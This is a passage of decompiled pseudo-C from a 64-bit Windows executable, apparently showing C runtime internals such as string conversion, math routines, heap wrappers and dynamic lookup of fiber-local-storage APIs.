    v7 = *(_DWORD *)sub_13F169DAC();
    goto LABEL_31;
  }
  while ( *v5 )
  {
    if ( (unsigned __int8)(*v5 - 65) <= 0x19u )
      *v5 += 32;
    ++v5;
  }
  return 0i64;
}

//----- (000000013F16D624) ----------------------------------------------------
_BYTE *__fastcall sub_13F16D624(_BYTE *a1)
{
  _BYTE *v1; // rbx

  v1 = a1;
  if ( a1 )
  {
    while ( *a1 )
    {
      if ( (unsigned __int8)(*a1 - 65) <= 0x19u )
        *a1 += 32;
      ++a1;
    }
    return v1;
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0i64;
  }
}
// 13F1C6238: using guessed type int dword_13F1C6238;

//----- (000000013F16D680) ----------------------------------------------------
__int64 __fastcall sub_13F16D680(_BYTE *a1, unsigned __int64 a2, __int128 *a3)
{
  __int64 result; // rax
  __int64 v6; // [rsp+20h] [rbp-28h] BYREF
  __int128 v7; // [rsp+28h] [rbp-20h] BYREF
  char v8; // [rsp+38h] [rbp-10h]

  sub_13F1687CC((__int64)&v6, a3);
  result = sub_13F16D3FC(a1, a2, &v7);
  if ( v8 )
    *(_DWORD *)(v6 + 936) &= ~2u;
  return result;
}

//----- (000000013F16D6CC) ----------------------------------------------------
__int64 __fastcall sub_13F16D6CC(__int64 a1)
{
  signed int v2; // edi
  __int16 *v3; // rsi
  int v4; // eax

  if ( (*(_DWORD *)(a1 + 20) & 3) == 2 && (*(_DWORD *)(a1 + 20) & 0xC0) != 0 )
  {
    v2 = *(_DWORD *)a1 - *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 16) = 0;
    v3 = *(__int16 **)(a1 + 8);
    *(_QWORD *)a1 = v3;
    if ( v2 > 0 )
    {
      v4 = sub_13F1705A0(a1);
      if ( v2 != (unsigned int)sub_13F1741D0(v4, v3, v2) )
      {
        _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x10u);
        return 0xFFFFFFFFi64;
      }
      if ( (*(_DWORD *)(a1 + 20) & 4) != 0 )
        _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFFD);
    }
  }
  return 0i64;
}

//----- (000000013F16D744) ----------------------------------------------------
__int64 __fastcall sub_13F16D744(__int64 a1)
{
  int v3; // eax

  if ( !a1 )
    return sub_13F16D79C(0);
  if ( (unsigned int)sub_13F16D6CC(a1) )
    return 0xFFFFFFFFi64;
  if ( (*(_DWORD *)(a1 + 20) & 0x800) != 0 )
  {
    v3 = sub_13F1705A0(a1);
    if ( (unsigned int)sub_13F173B9C(v3) )
      return 0xFFFFFFFFi64;
  }
  return 0i64;
}

//----- (000000013F16D790) ----------------------------------------------------
__int64 sub_13F16D790()
{
  return sub_13F16D79C(1);
}

//----- (000000013F16D79C) ----------------------------------------------------
__int64 __fastcall sub_13F16D79C(int a1)
{
  __int64 i; // rdi
  __int64 v3; // rbx
  int v4; // eax
  int v5; // edx
  __int64 result; // rax
  unsigned int v7; // [rsp+20h] [rbp-38h]
  unsigned int v8; // [rsp+24h] [rbp-34h]

  v8 = 0;
  v7 = 0;
  sub_13F170628();
  for ( i = 3981808i64; i != 3985904; i += 8i64 )
  {
    v3 = *(_QWORD *)i;
    if ( *(_QWORD *)i )
    {
      sub_13F16807C();
      if ( (*(_DWORD *)(v3 + 20) & 0x2000) != 0 )
      {
        if ( a1 == 1 )
        {
          if ( (unsigned int)sub_13F16D744(v3) != -1 )
            ++v8;
        }
        else if ( !a1 && (*(_DWORD *)(v3 + 20) & 2) != 0 )
        {
          v4 = sub_13F16D744(v3);
          v5 = v7;
          if ( v4 == -1 )
            v5 = -1;
          v7 = v5;
        }
      }
      sub_13F168088();
    }
  }
  sub_13F17067C();
  result = v7;
  if ( a1 == 1 )
    return v8;
  return result;
}
// 13F1C6050: using guessed type int dword_13F1C6050;
// 13F1C6058: using guessed type __int64 qword_13F1C6058;

//----- (000000013F16D880) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
double __fastcall sub_13F16D880(double result)
{
  __int64 v13; // rcx

  if ( (*(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFui64) < 0x7FF0000000000000i64 )
  {
    __asm
    {
      vcmplesd xmm2, xmm0, cs:qword_13F18F1D0
      vcmpnltsd xmm3, xmm0, cs:qword_13F18F1D8
      vandps  xmm2, xmm3, xmm2
      vucomisd xmm2, xmm2
    }
    if ( __SETP__(1, 0) )
    {
      __asm { vmovq   rdx, xmm0 }
      if ( (_RDX & 0x7FFFFFFFFFFFFFFFui64) <= 0x3E50000000000000i64 )
      {
        __asm
        {
          vaddsd  xmm1, xmm0, cs:qword_13F18F238
          vaddsd  xmm0, xmm0, cs:qword_13F18F228
        }
        return result;
      }
      __asm
      {
        vmulsd  xmm1, xmm0, cs:qword_13F18F1E8
        vcvttpd2dq xmm2, xmm1
        vcvtdq2pd xmm1, xmm2
        vmovd   ecx, xmm2
        vmovlhps xmm1, xmm1, xmm1
        vmovq   xmm0, xmm0
        vfmadd132pd xmm1, xmm0, cs:xmmword_13F18F1B0
        vhaddpd xmm2, xmm1, xmm1
      }
      v13 = (unsigned int)(_ECX >> 6);
      __asm
      {
        vmovapd xmm3, cs:xmmword_13F18F160
        vfmadd213sd xmm3, xmm2, cs:qword_13F18F170
        vfmadd213sd xmm3, xmm2, cs:qword_13F18F1A0
        vfmadd213sd xmm3, xmm2, qword ptr cs:xmmword_13F18F180
        vfmadd213sd xmm3, xmm2, cs:qword_13F18F190
        vmulsd  xmm0, xmm2, xmm2
        vfmadd213sd xmm0, xmm3, xmm2
        vmulsd  xmm2, xmm0, qword ptr [rdx+rax*8]
        vaddsd  xmm1, xmm2, qword ptr [r11+rax*8]
        vaddsd  xmm0, xmm1, qword ptr [r10+rax*8]
      }
      if ( (int)v13 <= -1022 )
      {
        if ( (int)v13 < -1022 )
        {
          _RAX = 1i64 << ((unsigned __int8)v13 + 50);
          __asm
          {
            vmovq   xmm2, rax
            vmulsd  xmm0, xmm0, xmm2
          }
          return result;
        }
        __asm { vucomisd xmm0, cs:qword_13F18F228 }
      }
      _RCX = v13 << 52;
      __asm
      {
        vmovq   xmm2, rcx
        vpaddq  xmm0, xmm0, xmm2
      }
    }
    else
    {
      __asm { vucomisd xmm0, cs:qword_13F18F1D0 }
      _RAX = 0x7FF0000000000000i64;
      __asm { vmovq   xmm1, rax }
      *(_QWORD *)&result = sub_13F1745A0(result, *(double *)&_XMM1, 3).m128_u64[0];
    }
  }
  else if ( result != INFINITY )
  {
    if ( result == -INFINITY )
      return 0.0;
    else
      *(_QWORD *)&result |= 0x8000000000000ui64;
  }
  return result;
}
// 13F16DBDA: conditional instruction was optimized away because ecx.4==FFFFFC02
// 13F16D880: inconsistent variable size for 'xmm0_8.8(result)'
// 13F1C6A40: using guessed type int dword_13F1C6A40;

//----- (000000013F16DC78) ----------------------------------------------------
double __fastcall sub_13F16DC78(double a1)
{
  if ( (*(_QWORD *)&a1 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
  {
    if ( (*(_QWORD *)&a1 & 0xFFFFFFFFFFFFFi64) != 0 )
      return sub_13F1749B8(*(__int64 *)&a1);
    if ( a1 < 0.0 )
      return sub_13F17475C((__int64)"sqrt", 5, 0xFFF8000000000000ui64, 1, 8, 0x21u, a1, 0i64, 1);
  }
  if ( (*(_QWORD *)&a1 & 0x7FFFFFFFFFFFFFFFi64) != 0 && a1 < 0.0 )
    return sub_13F17475C((__int64)"sqrt", 5, 0xFFF8000000000000ui64, 1, 8, 0x21u, a1, 0i64, 1);
  else
    return sqrt(a1);
}

//----- (000000013F16DD4C) ----------------------------------------------------
__int64 __fastcall sub_13F16DD4C(_BYTE *a1, __int64 a2, __int64 a3)
{
  unsigned int v3; // ebx
  char *v4; // rax
  _BYTE *v6; // r9
  __int64 v7; // r8
  char v8; // al

  v3 = 0;
  if ( !a1 || !a2 )
    goto LABEL_5;
  if ( !a3 )
  {
    *a1 = 0;
LABEL_5:
    v4 = sub_13F169DAC();
    v3 = 22;
LABEL_6:
    *(_DWORD *)v4 = v3;
    sub_13F1682A0();
    return v3;
  }
  v6 = a1;
  v7 = a3 - (_QWORD)a1;
  do
  {
    v8 = v6[v7];
    *v6++ = v8;
    if ( !v8 )
      break;
    --a2;
  }
  while ( a2 );
  if ( !a2 )
  {
    *a1 = 0;
    v4 = sub_13F169DAC();
    v3 = 34;
    goto LABEL_6;
  }
  return v3;
}

//----- (000000013F16DDAC) ----------------------------------------------------
void __noreturn sub_13F16DDAC()
{
  if ( sub_13F172C70() )
    sub_13F172CC0(0x16u);
  if ( (unsigned int)sub_13F178220(23i64) )
    __fastfail(7u);
  sub_13F168094(3, 1073741845, 1);
  sub_13F16A0FC(3u);
  JUMPOUT(0x13F16DE00i64);
}
// 13F16DDFB: control flows out of bounds to 13F16DE00
// 13F178220: using guessed type __int64 __fastcall sub_13F178220(_QWORD);

//----- (000000013F16DE04) ----------------------------------------------------
bool __fastcall sub_13F16DE04(char a1, unsigned int a2)
{
  bool result; // al
  int v3; // ecx

  result = 1;
  if ( (a1 & 4) == 0 )
  {
    if ( (a1 & 1) == 0 )
      return 0;
    v3 = a1 & 2;
    if ( (!v3 || a2 <= 0x80000000) && (v3 || a2 <= 0x7FFFFFFF) )
      return 0;
  }
  return result;
}

//----- (000000013F16DE30) ----------------------------------------------------
_QWORD *__fastcall sub_13F16DE30(_QWORD *a1, __int64 a2, _QWORD *a3)
{
  *a1 = a2;
  a1[1] = a3;
  if ( a3 )
    *a3 = a2;
  return a1;
}

//----- (000000013F16DE44) ----------------------------------------------------
__int64 __fastcall sub_13F16DE44(__int128 *a1, unsigned __int8 **a2, unsigned int a3, char a4)
{
  unsigned int v5; // er15
  unsigned __int8 *v7; // rcx
  unsigned int v9; // esi
  __int64 v10; // rdx
  signed __int8 v11; // di
  unsigned __int8 *i; // rax
  int v13; // eax
  int v14; // er14
  int v15; // eax
  unsigned __int8 v16; // dl
  unsigned __int8 *v17; // rcx
  unsigned __int8 *v18; // rcx
  unsigned int v19; // er8
  unsigned int v20; // ecx
  bool v21; // zf
  unsigned __int8 *v22; // rcx
  unsigned __int8 *v23; // rcx
  unsigned __int8 *v24; // rax
  __int64 v25; // [rsp+20h] [rbp-20h] BYREF
  __int128 v26; // [rsp+28h] [rbp-18h] BYREF
  char v27; // [rsp+38h] [rbp-8h]
  unsigned __int8 *v28; // [rsp+78h] [rbp+38h]

  v5 = a3;
  if ( !*a2 || a3 && a3 - 2 > 0x22 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
LABEL_3:
    v7 = a2[1];
    if ( v7 )
      *(_QWORD *)v7 = *a2;
    return 0i64;
  }
  sub_13F1687CC((__int64)&v25, a1);
  v9 = 0;
  v10 = v26;
  v28 = *a2;
  v11 = **a2;
  for ( i = *a2 + 1; ; i = *a2 + 1 )
  {
    *a2 = i;
    if ( *(int *)(v10 + 8) <= 1 )
    {
      v13 = *(_WORD *)(*(_QWORD *)v10 + 2i64 * (unsigned __int8)v11) & 8;
    }
    else
    {
      v13 = sub_13F170B80((unsigned __int8)v11, 8, &v26);
      v10 = v26;
    }
    if ( !v13 )
      break;
    v11 = **a2;
  }
  v14 = a4 != 0;
  if ( v11 == 45 )
  {
    v14 |= 2u;
  }
  else if ( v11 != 43 )
  {
    goto LABEL_18;
  }
  v11 = *(*a2)++;
LABEL_18:
  if ( (v5 & 0xFFFFFFEF) == 0 )
  {
    if ( (unsigned __int8)(v11 - 48) > 9u )
    {
      if ( (unsigned __int8)(v11 - 97) > 0x19u )
      {
        if ( (unsigned __int8)(v11 - 65) > 0x19u )
          v15 = -1;
        else
          v15 = v11 - 55;
      }
      else
      {
        v15 = v11 - 87;
      }
    }
    else
    {
      v15 = v11 - 48;
    }
    if ( v15 )
    {
      if ( !v5 )
        v5 = 10;
    }
    else
    {
      v16 = **a2;
      v17 = *a2 + 1;
      *a2 = v17;
      if ( ((v16 - 88) & 0xDF) != 0 )
      {
        if ( !v5 )
          v5 = 8;
        v18 = v17 - 1;
        *a2 = v18;
        if ( v16 && *v18 != v16 )
        {
          *(_DWORD *)sub_13F169DAC() = 22;
          sub_13F1682A0();
        }
      }
      else
      {
        v11 = *v17;
        if ( !v5 )
          v5 = 16;
        *a2 = v17 + 1;
      }
    }
  }
  v19 = 0xFFFFFFFF / v5;
  while ( 1 )
  {
    if ( (unsigned __int8)(v11 - 48) > 9u )
    {
      if ( (unsigned __int8)(v11 - 97) > 0x19u )
        v20 = (unsigned __int8)(v11 - 65) > 0x19u ? -1 : v11 - 55;
      else
        v20 = v11 - 87;
    }
    else
    {
      v20 = v11 - 48;
    }
    if ( v20 == -1 || v20 >= v5 )
      break;
    v14 |= 8u;
    if ( v9 < v19 || v9 == v19 && v20 <= 0xFFFFFFFF % v5 )
      v9 = v20 + v5 * v9;
    else
      v14 |= 4u;
    v11 = *(*a2)++;
  }
  --*a2;
  if ( v11 && **a2 != v11 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
  }
  if ( (v14 & 8) == 0 )
  {
    v21 = v27 == 0;
    *a2 = v28;
    if ( !v21 )
      *(_DWORD *)(v25 + 936) &= ~2u;
    goto LABEL_3;
  }
  if ( !sub_13F16DE04(v14, v9) )
  {
    if ( (v14 & 2) != 0 )
      v9 = -v9;
    goto LABEL_76;
  }
  *(_DWORD *)sub_13F169DAC() = 34;
  if ( (v14 & 1) == 0 )
  {
    v9 = -1;
LABEL_76:
    if ( v27 )
      *(_DWORD *)(v25 + 936) &= ~2u;
    v24 = a2[1];
    if ( v24 )
      *(_QWORD *)v24 = *a2;
    return v9;
  }
  if ( (v14 & 2) != 0 )
  {
    if ( v27 )
      *(_DWORD *)(v25 + 936) &= ~2u;
    v22 = a2[1];
    if ( v22 )
      *(_QWORD *)v22 = *a2;
    return 0x80000000i64;
  }
  else
  {
    if ( v27 )
      *(_DWORD *)(v25 + 936) &= ~2u;
    v23 = a2[1];
    if ( v23 )
      *(_QWORD *)v23 = *a2;
    return 0x7FFFFFFFi64;
  }
}

//----- (000000013F16E158) ----------------------------------------------------
__int64 __fastcall sub_13F16E158(__int64 a1)
{
  unsigned __int8 **v1; // rax
  __int64 v3[3]; // [rsp+20h] [rbp-18h] BYREF

  v1 = (unsigned __int8 **)sub_13F16DE30(v3, a1, 0i64);
  return sub_13F16DE44(0i64, v1, 0xAu, 1);
}
// 13F16E158: using guessed type __int64 var_18[3];

//----- (000000013F16E184) ----------------------------------------------------
__int64 __fastcall sub_13F16E184(_WORD *a1, _WORD *a2, __int64 a3)
{
  if ( !a3 )
    return 0i64;
  while ( --a3 && *a1 && *a1 == *a2 )
  {
    ++a1;
    ++a2;
  }
  return (unsigned __int16)*a1 - (unsigned int)(unsigned __int16)*a2;
}

//----- (000000013F16E1B0) ----------------------------------------------------
void __fastcall sub_13F16E1B0(__int64 a1, __int64 a2, __int64 a3)
{
  volatile signed __int32 *v4; // rcx

  sub_13F170628();
  v4 = *(volatile signed __int32 **)(**(_QWORD **)a3 + 136i64);
  if ( v4 && _InterlockedExchangeAdd(v4, 0xFFFFFFFF) == 1 && v4 != (volatile signed __int32 *)qword_13F1B7620 )
    sub_13F16E734((__int64)v4);
  sub_13F17067C();
}
// 13F1B7620: using guessed type __int64 qword_13F1B7620[11];

//----- (000000013F16E210) ----------------------------------------------------
void __fastcall sub_13F16E210(__int64 a1, __int64 a2, __int64 a3)
{
  sub_13F170628();
  sub_13F16E4C0(**(_QWORD **)a3, ***(_QWORD ***)(a3 + 8));
  sub_13F17067C();
}

//----- (000000013F16E258) ----------------------------------------------------
void __fastcall sub_13F16E258(__int64 a1, __int64 a2, __int64 a3)
{
  sub_13F170628();
  _InterlockedIncrement(*(volatile signed __int32 **)(**(_QWORD **)a3 + 136i64));
  sub_13F17067C();
}

//----- (000000013F16E298) ----------------------------------------------------
void __fastcall sub_13F16E298(__int64 a1, __int64 a2, __int64 **a3)
{
  sub_13F170628();
  sub_13F16E4C0(**a3, 0i64);
  sub_13F17067C();
}

//----- (000000013F16E2D8) ----------------------------------------------------
void __fastcall sub_13F16E2D8(__int64 a1)
{
  int v1; // [rsp+24h] [rbp-2Ch] BYREF
  __int64 v2; // [rsp+28h] [rbp-28h] BYREF
  wchar_t ***v3; // [rsp+30h] [rbp-20h] BYREF
  __int64 *v4; // [rsp+38h] [rbp-18h] BYREF
  __int64 v5[2]; // [rsp+40h] [rbp-10h] BYREF
  char v6; // [rsp+68h] [rbp+18h] BYREF
  int v7; // [rsp+70h] [rbp+20h]
  int v8; // [rsp+78h] [rbp+28h] BYREF

  v2 = a1;
  v4 = &v2;
  v7 = 5;
  v8 = 5;
  v5[0] = (__int64)&v2;
  v5[1] = (__int64)&v3;
  v1 = 4;
  v3 = &off_13F1C6820;
  *(_DWORD *)(a1 + 40) = 1;
  *(_QWORD *)v2 = qword_13F18EF80;
  *(_DWORD *)(v2 + 936) = 1;
  *(_QWORD *)(v2 + 136) = qword_13F1B7620;
  *(_WORD *)(v2 + 188) = 67;
  *(_WORD *)(v2 + 450) = 67;
  *(_QWORD *)(v2 + 928) = 0i64;
  sub_13F16E258((__int64)&v6, (__int64)&v8, (__int64)&v4);
  sub_13F16E210((__int64)&v6, (__int64)&v1, (__int64)v5);
}
// 13F18EF80: using guessed type __int64 qword_13F18EF80[2];
// 13F1B7620: using guessed type __int64 qword_13F1B7620[11];
// 13F1C6820: using guessed type wchar_t **off_13F1C6820;

//----- (000000013F16E3A8) ----------------------------------------------------
void __fastcall sub_13F16E3A8(__int64 *a1)
{
  if ( a1 )
  {
    sub_13F16E3C8(a1);
    sub_13F16E734((__int64)a1);
  }
}

//----- (000000013F16E3C8) ----------------------------------------------------
void __fastcall sub_13F16E3C8(__int64 *a1)
{
  int v1; // [rsp+24h] [rbp-1Ch] BYREF
  __int64 *v2; // [rsp+28h] [rbp-18h] BYREF
  __int64 **v3; // [rsp+30h] [rbp-10h] BYREF
  __int64 **v4; // [rsp+38h] [rbp-8h] BYREF
  char v5; // [rsp+58h] [rbp+18h] BYREF
  int v6; // [rsp+60h] [rbp+20h]
  int v7; // [rsp+68h] [rbp+28h] BYREF

  v2 = a1;
  v3 = &v2;
  v6 = 5;
  v7 = 5;
  v4 = &v2;
  v1 = 4;
  if ( (__int64 *)*a1 != qword_13F18EF80 )
  {
    sub_13F16E734(*a1);
    a1 = v2;
  }
  sub_13F16E734(a1[14]);
  sub_13F16E734(v2[11]);
  sub_13F16E734(v2[12]);
  sub_13F16E734(v2[13]);
  sub_13F16E734(v2[9]);
  sub_13F16E734(v2[10]);
  sub_13F16E734(v2[15]);
  sub_13F16E734(v2[16]);
  sub_13F16E734(v2[120]);
  sub_13F16E1B0((__int64)&v5, (__int64)&v7, (__int64)&v3);
  sub_13F16E298((__int64)&v5, (__int64)&v1, (__int64 **)&v4);
}
// 13F18EF80: using guessed type __int64 qword_13F18EF80[2];

//----- (000000013F16E4C0) ----------------------------------------------------
void __fastcall sub_13F16E4C0(__int64 a1, __int64 a2)
{
  __int64 v4; // rcx
  __int64 v5; // rcx

  v4 = *(_QWORD *)(a1 + 144);
  if ( v4 )
  {
    sub_13F173990(v4);
    v5 = *(_QWORD *)(a1 + 144);
    if ( (wchar_t **)v5 != &off_13F1B74B0 && !*(_DWORD *)(v5 + 16) )
      sub_13F173790((__int64 *)v5);
  }
  *(_QWORD *)(a1 + 144) = a2;
  if ( a2 )
    sub_13F173704(a2);
}
// 13F1B74B0: using guessed type wchar_t *off_13F1B74B0;
// 13F1C6820: using guessed type wchar_t **off_13F1C6820;

//----- (000000013F16E528) ----------------------------------------------------
__int64 sub_13F16E528()
{
  unsigned int v0; // ebx
  __int64 v1; // rdi
  __int64 v2; // rax
  __int64 v3; // rcx
  int v4; // eax

  v0 = MEMORY[0x76F91760]();
  v1 = sub_13F16EAB4(4u);
  if ( !v1 )
  {
    v2 = sub_13F16E6BC(1ui64, 0x3C8ui64);
    v1 = v2;
    if ( !v2 )
    {
      v3 = 0i64;
LABEL_4:
      sub_13F16E734(v3);
      goto LABEL_9;
    }
    v4 = sub_13F16EB0C(4u, v2);
    v3 = v1;
    if ( !v4 )
      goto LABEL_4;
    sub_13F16E2D8(v1);
    sub_13F16E734(0i64);
  }
  if ( !v1 )
  {
LABEL_9:
    MEMORY[0x76F91780](v0);
    sub_13F16DDAC();
  }
  MEMORY[0x76F91780](v0);
  return v1;
}

//----- (000000013F16E5BC) ----------------------------------------------------
__int64 sub_13F16E5BC()
{
  __int64 v0; // rsi
  unsigned int v1; // ebx
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rcx
  int v5; // eax

  v0 = 0i64;
  v1 = MEMORY[0x76F91760]();
  v2 = sub_13F16EAB4(4u);
  if ( !v2 )
  {
    v3 = sub_13F16E6BC(1ui64, 0x3C8ui64);
    v2 = v3;
    if ( !v3 )
    {
      v4 = 0i64;
LABEL_4:
      sub_13F16E734(v4);
      goto LABEL_8;
    }
    v5 = sub_13F16EB0C(4u, v3);
    v4 = v2;
    if ( !v5 )
      goto LABEL_4;
    sub_13F16E2D8(v2);
    sub_13F16E734(0i64);
  }
  if ( v2 )
  {
    MEMORY[0x76F91780](v1);
    return v2;
  }
LABEL_8:
  MEMORY[0x76F91780](v1);
  return v0;
}

//----- (000000013F16E65C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F16E65C()
{
  dword_13F1B74A4 = sub_13F16EA04((__int64)sub_13F16E3A8);
  if ( sub_13F16E5BC() )
    return 1;
  sub_13F16E698();
  return 0;
}
// 13F16E66C: write access to const memory at 13F1B74A4 has been detected
// 13F1B74A4: using guessed type int dword_13F1B74A4;

//----- (000000013F16E698) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F16E698()
{
  sub_13F16EA5C(4u);
  dword_13F1B74A4 = -1;
  return 1;
}
// 13F16E6AC: write access to const memory at 13F1B74A4 has been detected
// 13F1B74A4: using guessed type int dword_13F1B74A4;

//----- (000000013F16E6BC) ----------------------------------------------------
__int64 __fastcall sub_13F16E6BC(unsigned __int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rbx
  __int64 result; // rax

  if ( a1 && 0xFFFFFFFFFFFFFFE0ui64 / a1 < a2 )
  {
LABEL_10:
    *(_DWORD *)sub_13F169DAC() = 12;
    return 0i64;
  }
  else
  {
    v2 = a2 * a1;
    if ( !(a2 * a1) )
      v2 = 1i64;
    while ( 1 )
    {
      result = MEMORY[0x771DDA30](3735552i64, 8i64, v2);
      if ( result )
        break;
      if ( !(unsigned int)sub_13F16D3C0() || !sub_13F16C1D0(v2) )
        goto LABEL_10;
    }
  }
  return result;
}
// 13F1C6A70: using guessed type __int64 qword_13F1C6A70;

//----- (000000013F16E734) ----------------------------------------------------
void __fastcall sub_13F16E734(__int64 a1)
{
  char *v1; // rbx
  int v2; // eax

  if ( a1 )
  {
    if ( !(unsigned int)MEMORY[0x76F91A00](3735552i64, 0i64, a1) )
    {
      v1 = sub_13F169DAC();
      v2 = MEMORY[0x76F91760]();
      *(_DWORD *)v1 = sub_13F169CF4(v2);
    }
  }
}
// 13F1C6A70: using guessed type __int64 qword_13F1C6A70;

//----- (000000013F16E774) ----------------------------------------------------
__int64 __fastcall sub_13F16E774(unsigned int a1, __int64 a2, unsigned int *a3, unsigned int *a4)
{
  __int64 v4; // r14
  unsigned int *v6; // rbp
  uintptr_t v8; // r10
  __int64 v9; // rdx
  __int64 result; // rax
  __int64 v11; // rsi
  __int64 v12; // rbx
  wchar_t *v13; // r15

  v4 = a1;
  v6 = a3;
  v8 = _security_cookie;
  v9 = __ROR8__(qword_13F1C62F0[a1] ^ _security_cookie, _security_cookie & 0x3F);
  if ( v9 == -1 )
    return 0i64;
  if ( v9 )
    return v9;
  if ( a3 == a4 )
  {
LABEL_19:
    v12 = 0i64;
    goto LABEL_20;
  }
  while ( 1 )
  {
    v11 = *v6;
    v12 = qword_13F1C6250[v11];
    if ( !v12 )
      break;
    if ( v12 != -1 )
      goto LABEL_23;
LABEL_17:
    if ( ++v6 == a4 )
    {
      v8 = _security_cookie;
      goto LABEL_19;
    }
  }
  v13 = off_13F18F260[v11];
  v12 = MEMORY[0x76F85AE0](v13, 0i64, 2048i64);
  if ( !v12 )
  {
    if ( (unsigned int)MEMORY[0x76F91760]() == 87 )
      v12 = MEMORY[0x76F85AE0](v13, 0i64, 0i64);
    else
      v12 = 0i64;
  }
  if ( !v12 )
  {
    _InterlockedExchange64(&qword_13F1C6250[v11], -1i64);
    goto LABEL_17;
  }
  if ( _InterlockedExchange64(&qword_13F1C6250[v11], v12) )
    MEMORY[0x76F85AC0](v12);
LABEL_23:
  v8 = _security_cookie;
LABEL_20:
  if ( v12 )
  {
    result = MEMORY[0x76F92020](v12, a2);
    if ( result )
    {
      _InterlockedExchange64(
        &qword_13F1C62F0[v4],
        _security_cookie ^ __ROR8__(result, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)));
      return result;
    }
    v8 = _security_cookie;
  }
  _InterlockedExchange64(&qword_13F1C62F0[v4], v8 ^ __ROR8__(-1i64, 64 - ((unsigned __int8)v8 & 0x3Fu)));
  return 0i64;
}
// 13F16E873: conditional instruction was optimized away because rbx.8!=0
// 13F18F260: using guessed type wchar_t *off_13F18F260[2];
// 13F1C6250: using guessed type __int64 qword_13F1C6250[];
// 13F1C62F0: using guessed type __int64 qword_13F1C62F0[];

//----- (000000013F16E914) ----------------------------------------------------
__int64 __fastcall sub_13F16E914(
        __int64 a1,
        unsigned int a2,
        __int64 a3,
        unsigned int a4,
        __int64 a5,
        int a6,
        __int64 a7,
        __int64 a8,
        __int64 a9)
{
  __int64 (__fastcall *v13)(__int64, _QWORD, __int64, _QWORD, __int64, int, __int64, __int64, __int64); // rbx
  unsigned int v15; // eax

  v13 = (__int64 (__fastcall *)(__int64, _QWORD, __int64, _QWORD, __int64, int, __int64, __int64, __int64))sub_13F16E774(1u, (__int64)"CompareStringEx", (unsigned int *)L"\a", (unsigned int *)"CompareStringEx");
  if ( v13 )
    return v13(a1, a2, a3, a4, a5, a6, a7, a8, a9);
  v15 = sub_13F16ED34(a1, 0);
  return MEMORY[0x76F84EB0](v15, a2, a3, a4, a5, a6);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F840: using guessed type wchar_t asc_13F18F840[2];

//----- (000000013F16EA04) ----------------------------------------------------
__int64 __fastcall sub_13F16EA04(__int64 a1)
{
  __int64 (__fastcall *v2)(__int64); // rax

  v2 = (__int64 (__fastcall *)(__int64))sub_13F16E774(
                                          3u,
                                          (__int64)"FlsAlloc",
                                          (unsigned int *)&qword_13F18F858,
                                          (unsigned int *)"FlsAlloc");
  if ( v2 )
    return v2(a1);
  else
    return MEMORY[0x76F865A0]();
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F858: using guessed type __int64 qword_13F18F858;

//----- (000000013F16EA5C) ----------------------------------------------------
__int64 __fastcall sub_13F16EA5C(unsigned int a1)
{
  __int64 (__fastcall *v2)(_QWORD); // rax

  v2 = (__int64 (__fastcall *)(_QWORD))sub_13F16E774(
                                         4u,
                                         (__int64)"FlsFree",
                                         (unsigned int *)&qword_13F18F870,
                                         (unsigned int *)"FlsFree");
  if ( v2 )
    return v2(a1);
  else
    return MEMORY[0x76F80A30](a1);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F870: using guessed type __int64 qword_13F18F870;

//----- (000000013F16EAB4) ----------------------------------------------------
__int64 __fastcall sub_13F16EAB4(unsigned int a1)
{
  __int64 (__fastcall *v2)(_QWORD); // rax

  v2 = (__int64 (__fastcall *)(_QWORD))sub_13F16E774(
                                         5u,
                                         (__int64)"FlsGetValue",
                                         (unsigned int *)&qword_13F18F880,
                                         (unsigned int *)"FlsGetValue");
  if ( v2 )
    return v2(a1);
  else
    return MEMORY[0x76F91580](a1);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F880: using guessed type __int64 qword_13F18F880;

//----- (000000013F16EB0C) ----------------------------------------------------
__int64 __fastcall sub_13F16EB0C(unsigned int a1, __int64 a2)
{
  __int64 (__fastcall *v4)(_QWORD, __int64); // rax

  v4 = (__int64 (__fastcall *)(_QWORD, __int64))sub_13F16E774(
                                                  6u,
                                                  (__int64)"FlsSetValue",
                                                  (unsigned int *)&qword_13F18F898,
                                                  (unsigned int *)"FlsSetValue");
  if ( v4 )
    return v4(a1, a2);
  else
    return MEMORY[0x76F85170](a1, a2);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F898: using guessed type __int64 qword_13F18F898;

//----- (000000013F16EB74) ----------------------------------------------------
__int64 __fastcall sub_13F16EB74(__int64 a1)
{
  __int64 (__fastcall *v2)(__int64); // rax

  v2 = (__int64 (__fastcall *)(__int64))sub_13F16E774(
                                          0xFu,
                                          (__int64)"GetSystemTimePreciseAsFileTime",
                                          (unsigned int *)"\t",
                                          (unsigned int *)"GetSystemTimePreciseAsFileTime");
  if ( v2 )
    return v2(a1);
  else
    return MEMORY[0x76F833E0](a1);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16EBCC) ----------------------------------------------------
__int64 __fastcall sub_13F16EBCC(__int64 a1, unsigned int a2, unsigned int a3)
{
  __int64 (__fastcall *v6)(__int64, _QWORD, _QWORD); // rax

  v6 = (__int64 (__fastcall *)(__int64, _QWORD, _QWORD))sub_13F16E774(
                                                          0x14u,
                                                          (__int64)"InitializeCriticalSectionEx",
